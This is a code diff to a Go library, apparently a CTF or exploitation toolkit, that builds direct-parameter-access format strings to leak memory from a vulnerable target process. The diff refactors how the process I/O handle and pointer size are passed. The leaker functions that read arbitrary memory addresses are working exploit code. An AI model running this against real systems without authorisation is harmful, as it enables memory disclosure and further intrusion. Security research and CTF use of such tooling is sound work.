@@ -13,25 +13,18 @@ import (
 // specifically rely on the direct parameter access (DPA) feature found
 // in the format family of C functions.
 type DPAFormatStringConfig struct {
-	// ProcessIOFn is a function that returns a process' ProcessIO,
-	// which is used to interact with the process.
-	ProcessIOFn func() ProcessIO
+	// ProcessIO is the process' ProcessIO used to interact
+	// with the underlying process.
+	ProcessIO ProcessIO
 
-	// MaxNumParams is the maximum number of DPA argument numbers
-	// that will be accessed. This is required in order to
-	// guarantee that the resulting format string will be correctly
-	// padded to hold that upper limit without shifting the
-	// alignment of the string with the size of a pointer on
-	// the target system.
+	// MaxNumParams is the maximum number of direct parameter access
+	// argument numbers that will be accessed.
+	//
+	// This is required in order to guarantee that the resulting format
+	// string will be correctly padded to hold that upper limit of
+	// argument numbers without shifting the alignment of the string
+	// with the size of a pointer on the target system.
 	MaxNumParams int
-
-	// PointerSize is the size of a pointer on the target system
-	// in bytes. Generally speaking, this is the number of bits
-	// divided by 8. For example, a 64-bit pointer would be
-	// 8 bytes. This is used to ensure that the resulting
-	// format string is aligned with the amount of data that
-	// a format string function reads per format specifier.
-	PointerSize int
 
 	// Verbose is an optional *log.Logger that can be used to
 	// obtain more information when interacting with a process
@@ -40,15 +33,15 @@ type DPAFormatStringConfig struct {
 }
 
 func (o DPAFormatStringConfig) validate() error {
-	if o.ProcessIOFn == nil {
-		return fmt.Errorf("get process function cannot be nil")
+	if o.ProcessIO == nil {
+		return fmt.Errorf("processio cannot be nil")
 	}
 
 	if o.MaxNumParams <= 0 {
 		return fmt.Errorf("maximum number of format function parameters must be greater than 0")
 	}
 
-	if o.PointerSize <= 0 {
+	if o.ProcessIO.PointerSizeBytes() <= 0 {
 		return fmt.Errorf("pointer size in bytes must be greater than 0")
 	}
 
@@ -82,7 +75,7 @@ func SetupFormatStringLeakViaDPA(config DPAFormatStringConfig) (*FormatStringLea
 			buff := bytes.NewBuffer(nil)
 			builder.appendDPALeak(config.MaxNumParams, []byte("p"), buff)
 
-			return builder, stringLenMemoryAligned(buff.Bytes(), config.PointerSize)
+			return builder, stringLenMemoryAligned(buff.Bytes(), config.ProcessIO.PointerSizeBytes())
 		},
 	}
 
@@ -92,7 +85,7 @@ func SetupFormatStringLeakViaDPA(config DPAFormatStringConfig) (*FormatStringLea
 	}
 
 	return &FormatStringLeaker{
-		procIOFn:  config.ProcessIOFn,
+		procIO:    config.ProcessIO,
 		builder:   dpaLeakConfig.builder,
 		formatStr: dpaLeakConfig.builder.buildDPA(dpaLeakConfig.paramNum, []byte("s"), dpaLeakConfig.alignLen),
 	}, nil
@@ -123,14 +116,15 @@ func createDPAFormatStringLeakWithLastValueAsArg(config dpaLeakSetupConfig) (*dp
 		return nil, err
 	}
 
-	oracle, err := randomStringOfCharsAndNums(config.dpaConfig.PointerSize)
+	pointerSizeBytes := config.dpaConfig.ProcessIO.PointerSizeBytes()
+	oracle, err := randomStringOfCharsAndNums(pointerSizeBytes)
 	if err != nil {
 		return nil, fmt.Errorf("failed to generate oracle string - %w", err)
 	}
 
-	invertedOracle := make([]byte, config.dpaConfig.PointerSize)
-	for i := 0; i < config.dpaConfig.PointerSize; i++ {
-		invertedOracle[i] = oracle[config.dpaConfig.PointerSize-i-1]
+	invertedOracle := make([]byte, pointerSizeBytes)
+	for i := 0; i < pointerSizeBytes; i++ {
+		invertedOracle[i] = oracle[pointerSizeBytes-i-1]
 	}
 
 	// TODO: Some platforms do not include '0x' in the format
@@ -152,7 +146,7 @@ func createDPAFormatStringLeakWithLastValueAsArg(config dpaLeakSetupConfig) (*dp
 		fmtStrBuilder.appendDPALeak(i, specifier, buff)
 
 		leakedValue, err := leakDataWithFormatString(
-			config.dpaConfig.ProcessIOFn(),
+			config.dpaConfig.ProcessIO,
 			append(fmtStrBuilder.build(memoryAlignedLen, buff), oracle...),
 			fmtStrBuilder)
 		if err != nil {
@@ -193,7 +187,7 @@ type dpaLeakConfig struct {
 type FormatStringLeaker struct {
 	formatStr []byte
 	builder   formatStringBuilder
-	procIOFn  func() ProcessIO
+	procIO    ProcessIO
 }
 
 // MemoryAtOrExit calls FormatStringLeaker.MemoryAt, subsequently calling
@@ -210,7 +204,7 @@ func (o FormatStringLeaker) MemoryAtOrExit(pointer Pointer) []byte {
 
 // MemoryAt attempts to read the memory at the specified pointer.
 func (o FormatStringLeaker) MemoryAt(pointer Pointer) ([]byte, error) {
-	return leakDataWithFormatString(o.procIOFn(), o.FormatString(pointer), o.builder)
+	return leakDataWithFormatString(o.procIO, o.FormatString(pointer), o.builder)
 }
 
 // FormatString returns a new format string that can be used to leak
@@ -249,7 +243,7 @@ func NewDPAFormatStringLeaker(config DPAFormatStringConfig) (*DPAFormatStringLea
 	return &DPAFormatStringLeaker{
 		config:     config,
 		builder:    fmtStrBuilder,
-		alignedLen: stringLenMemoryAligned(unalignedBuff.Bytes(), config.PointerSize),
+		alignedLen: stringLenMemoryAligned(unalignedBuff.Bytes(), config.ProcessIO.PointerSizeBytes()),
 	}, nil
 }
 
@@ -336,7 +330,7 @@ func (o DPAFormatStringLeaker) MemoryAtParam(paramNumber int) ([]byte, error) {
 			paramNumber, o.config.MaxNumParams)
 	}
 
-	return leakDataWithFormatString(o.config.ProcessIOFn(), o.FormatString(paramNumber), o.builder)
+	return leakDataWithFormatString(o.config.ProcessIO, o.FormatString(paramNumber), o.builder)
 }
 
 // FormatString returns a new format string that can be used to leak data
@@ -352,18 +346,18 @@ func (o DPAFormatStringLeaker) FormatString(paramNum int) []byte {
 //
 // TODO: Support for retrieving multiple values.
 //  E.g., |0x0000000000000001||0x0000000000000002|endstrdel
-func leakDataWithFormatString(process ProcessIO, formatStr []byte, builder formatStringBuilder) ([]byte, error) {
+func leakDataWithFormatString(processIO ProcessIO, formatStr []byte, builder formatStringBuilder) ([]byte, error) {
 	err := builder.isSuitableForLeaking()
 	if err != nil {
 		return nil, fmt.Errorf("format string is not suitable for leaking data - %w", err)
 	}
 
-	err = process.WriteLine(formatStr)
+	err = processIO.WriteLine(formatStr)
 	if err != nil {
 		return nil, fmt.Errorf("failed to write format string to process - %w", err)
 	}
 
-	token, err := process.ReadUntil(builder.endOfStringDelim)
+	token, err := processIO.ReadUntil(builder.endOfStringDelim)
 	if err != nil {
 		return nil, fmt.Errorf("failed to find end of string delim in process output - %w", err)
 	}
